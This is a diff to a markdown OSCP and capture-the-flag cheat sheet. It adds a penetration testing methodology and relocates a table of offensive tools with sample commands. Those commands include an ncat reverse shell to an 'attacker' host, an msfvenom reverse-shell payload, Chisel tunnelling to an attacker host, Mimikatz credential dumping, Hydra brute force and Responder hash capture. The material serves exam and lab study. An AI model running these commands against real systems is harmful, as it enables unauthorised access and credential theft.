@@ -1,8 +1,11 @@
 - [Capture the flag](#capture-the-flag)
+- [Penetration testing methodology](#penetration-testing-methodology)
 - [Reverse shell](#reverse-shell)
 - [File transfer](#file-transfer)
 - [Remote to other machines](#remote-to-other-machines)
 - [Ports scan](#ports-scan)
+- [OSCP Pro tips](#oscp-pro-tips)
+- [Recommended OSCP Cracking Tools & Usage (2025)](#recommended-oscp-cracking-tools-&-usage-(2025))
 
 # Capture the flag 
 - Flag format: `OS{68c1a60008e872f3b525407de04e48a3}`  
@@ -14,6 +17,54 @@
     - `PS C:\users> Get-ChildItem -Path C:\ -Recurse -Filter "local.txt" -ErrorAction SilentlyContinue`  
     - `type C:\Users\<username>\Desktop\local.txt`  
     - `type C:\Users\Administrator\Desktop\proof.txt`
+      
+# Penetration testing methodology
+1. Identify in-scope hosts: servers, workstations, network devices
+1. info gathering (passive or active): org infra, assets, personnel
+   - WHOIS, DNS
+   - Public resources: LinkedIn, GitHub, Shodan, Google search
+   - Examime SSL/TLS certs, banners, public repos
+   - active recon: nmap for host discovery, ports, service, version, banner grabbing
+1. vulnerability detection
+   - Identify unpatched services (E.g: SMB, RDP, Apache, MySQL)
+   - Check for default/weak credentials
+   - automated scanners: nmap --script vuln, nikto, wpscan
+   - manual verification: test SQLi, LFI/RFI, command injection, file upload functionality
+   - tools: nmap, AutoRecon  
+1. initial foothold
+   - Exploit vulnerable service: SMB, FTP, RDP, SSH
+   - Web exploitation: SQLi → shell upload, RCE
+   - Credential reuse / default creds
+   - web fuzzing: Feroxbuster, WFUF, Burp  
+   - tools: nc, curl, wget, hydra, gobuster
+   - password cracking: John, Hashcat, Hydra  
+1. privilege escalation
+   - Linux (LinPEAS)
+     - Kernel exploits `searchsploit`
+     - SUID/SGID binaries `find / -perm -4000 -type f 2>/dev/null`
+     - Misconfigured sudoers or cron jobs
+     - Password reuse (from .ssh, history, config files)  
+   - Windows (WinPEAS)
+     - Weak ACLs / unquoted service paths
+     - Vulnerable software (MS17-010 / EternalBlue)
+     - Token impersonation (Mimikatz)
+     - Cached creds or saved passwords (ntds.dit, SAM/SYSTEM)
+     - Enumerate both local & domain privileges
+1. lateral movement
+   - Windows: Pass-the-Hash, Kerberos attacks, RDP, SMB, WMI
+   - Linux: SSH key reuse, weak passwords, cron jobs
+   - Pivoting via compromised host (ligolo-ng, Impacket, CME, Chisel, proxychains, ssh -L, socat)    
+1. report
+   - Scope & methodology
+   - Hosts discovered and services.
+   - Vulnerabilities and exploitation steps.
+   - Evidence (screenshots, file hashes, flags).
+   - Recommendations for mitigation
+     - Patch systems, close unused ports/services
+     - Enforce strong passwords and multi-factor authentication
+     - Limit user privileges (principle of least privilege)
+     - Monitor for suspicious activity and audit logs
+     - Network segmentation and firewall rules
 
 # Reverse shell
 - Kali listener
@@ -204,52 +255,7 @@
 - Combined TCP & UDP  
   `nmap -sS -sU --top-ports 100 -oN top_tcp_udp.txt <IP>`
 
-# Penetration testing stages
-1. scope: IP range, hosts, applications
-1. info gathering (passive or active): org infra, assets, personnel
-1. vulnerability detection
-1. initial foothold
-1. privilege escalation
-1. lateral movement
-1. report
-1. remediation
-
-# Recommended OSCP Cracking Tools & Usage (2025)
-| Tool              | Purpose                                  | Sample Command | Info / Output |
-|------------------|------------------------------------------|----------------|----------------|
-| **nmap**          | Port scan, service/version detection      | `nmap -sC -sV -oN scan.txt 10.10.10.10` | Shows open ports, services, versions, default scripts |
-| **AutoRecon**     | Automated enumeration pipeline            | `autorecon 10.10.10.10` | Organizes scans, runs Nmap, Gobuster, LinPEAS automatically |
-| **Gobuster**      | Web directory brute-force                 | `gobuster dir -u http://target -w common.txt` | Lists hidden directories or files |
-| **Feroxbuster**   | Recursive web content discovery           | `feroxbuster -u http://target -w wordlist.txt` | Recursively finds directories/files |
-| **FFUF**          | Fast web fuzzing                          | `ffuf -u http://target/FUZZ -w wordlist.txt` | Reveals valid endpoints via response codes |
-| **WFuzz**         | Web input fuzzing                         | `wfuzz -c -z file,rockyou.txt --hc 404 http://target/FUZZ` | Discovers fuzzable parameters, paths |
-| **Nikto**         | Web server vulnerability scanner          | `nikto -h http://target` | Lists known issues in web server setup |
-| **Burp Suite**    | Manual/intercept web testing              | GUI Tool       | Captures/fuzzes requests, intercepts traffic |
-| **Hydra**         | Brute-force remote logins                 | `hydra -l admin -P rockyou.txt ssh://10.10.10.10` | Cracks login credentials |
-| **John the Ripper** | Offline hash cracking                   | `john hash.txt --wordlist=rockyou.txt` | Cracked hash output |
-| **Hashcat**       | GPU-based hash cracking                   | `hashcat -m 1000 hash.txt rockyou.txt` | Fast crack of NTLM or other hashes |
-| **wget**          | Download files                            | `wget http://10.10.10.10/file.sh` | Saves remote file locally |
-| **curl**          | File transfer / request testing           | `curl -O http://10.10.10.10/file.sh` | Displays or downloads response |
-| **ncat** (netcat) | File transfer, bind/reverse shell         | `ncat -lvnp 4444` / `ncat -e /bin/bash attacker 4444` | Listener or shell |
-| **ssh**           | Remote login via SSH                      | `ssh user@10.10.10.10` | Secure shell access |
-| **python**        | Simple webserver, reverse shell, etc.     | `python3 -m http.server` or `python -c 'reverse shell'` | Serve payloads or pop shells |
-| **Impacket**      | Remote access tools (SMB/RPC)             | `wmiexec.py user:pass@10.10.10.10` | Remote shell, file transfer, SID enumeration |
-| **CrackMapExec**  | SMB tool + post-exploitation              | `cme smb 10.10.10.10 -u user -p pass` | Check share access, dump hashes, validate creds |
-| **Responder**     | LLMNR/NetBIOS poisoning                   | `responder -I eth0` | Captures NTLMv2 hashes |
-| **LinPEAS**       | Linux privilege escalation script         | `./linpeas.sh` | Highlights privesc vectors in color |
-| **WinPEAS**       | Windows privilege escalation script       | `winPEASx64.exe` | Checks for service misconfigs, ACLs, registry abuse |
-| **Chisel**        | Tunneling over HTTP                       | `chisel server -p 9001` / `chisel client attacker:9001 R:localhost:3389` | Pivoting, port forwarding |
-| **Mimikatz**      | Credential dumping (Windows)              | `privilege::debug`, `sekurlsa::logonpasswords` | Reveals passwords, hashes, tickets |
-| **msfvenom**      | Payload generation                        | `msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe` | Generates reverse shell binaries |
-| **Metasploit**    | Exploits + post modules                   | `msfconsole` → use exploits | Interactive exploit framework with session management |
-
-## OSCP Pro Tips
-- Always start with **Nmap**, **AutoRecon**, and web enumeration tools.
-- Use **Burp**, **WFUF**, and **Feroxbuster** for web fuzzing.
-- After access, use **LinPEAS** or **WinPEAS** for privilege escalation paths.
-- Use **Impacket**, **CME**, or **Chisel** for pivoting.
-- Crack hashes using **John**, **Hashcat**, or online resources.
-
+# OSCP Pro Tips
 | Tip Category       | Tip |
 |--------------------|-----|
 | **General Strategy** | Start with **AutoRecon or manual Nmap**, then branch into web (Gobuster/Feroxbuster), SMB (CME/Impacket), or known services. |
@@ -516,3 +522,34 @@ searchsploit linux kernel 4.15
 - `/etc/passwd`, `/etc/shadow`, SAM
 - History files and config files
 - Scripts or backups with credentials
+
+# Recommended OSCP Cracking Tools & Usage (2025)
+| Tool              | Purpose                                  | Sample Command | Info / Output |
+|------------------|------------------------------------------|----------------|----------------|
+| **nmap**          | Port scan, service/version detection      | `nmap -sC -sV -oN scan.txt 10.10.10.10` | Shows open ports, services, versions, default scripts |
+| **AutoRecon**     | Automated enumeration pipeline            | `autorecon 10.10.10.10` | Organizes scans, runs Nmap, Gobuster, LinPEAS automatically |
+| **Gobuster**      | Web directory brute-force                 | `gobuster dir -u http://target -w common.txt` | Lists hidden directories or files |
+| **Feroxbuster**   | Recursive web content discovery           | `feroxbuster -u http://target -w wordlist.txt` | Recursively finds directories/files |
+| **FFUF**          | Fast web fuzzing                          | `ffuf -u http://target/FUZZ -w wordlist.txt` | Reveals valid endpoints via response codes |
+| **WFuzz**         | Web input fuzzing                         | `wfuzz -c -z file,rockyou.txt --hc 404 http://target/FUZZ` | Discovers fuzzable parameters, paths |
+| **Nikto**         | Web server vulnerability scanner          | `nikto -h http://target` | Lists known issues in web server setup |
+| **Burp Suite**    | Manual/intercept web testing              | GUI Tool       | Captures/fuzzes requests, intercepts traffic |
+| **Hydra**         | Brute-force remote logins                 | `hydra -l admin -P rockyou.txt ssh://10.10.10.10` | Cracks login credentials |
+| **John the Ripper** | Offline hash cracking                   | `john hash.txt --wordlist=rockyou.txt` | Cracked hash output |
+| **Hashcat**       | GPU-based hash cracking                   | `hashcat -m 1000 hash.txt rockyou.txt` | Fast crack of NTLM or other hashes |
+| **wget**          | Download files                            | `wget http://10.10.10.10/file.sh` | Saves remote file locally |
+| **curl**          | File transfer / request testing           | `curl -O http://10.10.10.10/file.sh` | Displays or downloads response |
+| **ncat** (netcat) | File transfer, bind/reverse shell         | `ncat -lvnp 4444` / `ncat -e /bin/bash attacker 4444` | Listener or shell |
+| **ssh**           | Remote login via SSH                      | `ssh user@10.10.10.10` | Secure shell access |
+| **python**        | Simple webserver, reverse shell, etc.     | `python3 -m http.server` or `python -c 'reverse shell'` | Serve payloads or pop shells |
+| **Impacket**      | Remote access tools (SMB/RPC)             | `wmiexec.py user:pass@10.10.10.10` | Remote shell, file transfer, SID enumeration |
+| **CrackMapExec**  | SMB tool + post-exploitation              | `cme smb 10.10.10.10 -u user -p pass` | Check share access, dump hashes, validate creds |
+| **Responder**     | LLMNR/NetBIOS poisoning                   | `responder -I eth0` | Captures NTLMv2 hashes |
+| **LinPEAS**       | Linux privilege escalation script         | `./linpeas.sh` | Highlights privesc vectors in color |
+| **WinPEAS**       | Windows privilege escalation script       | `winPEASx64.exe` | Checks for service misconfigs, ACLs, registry abuse |
+| **Chisel**        | Tunneling over HTTP                       | `chisel server -p 9001` / `chisel client attacker:9001 R:localhost:3389` | Pivoting, port forwarding |
+| **Mimikatz**      | Credential dumping (Windows)              | `privilege::debug`, `sekurlsa::logonpasswords` | Reveals passwords, hashes, tickets |
+| **msfvenom**      | Payload generation                        | `msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe` | Generates reverse shell binaries |
+| **Metasploit**    | Exploits + post modules                   | `msfconsole` → use exploits | Interactive exploit framework with session management |
+
+
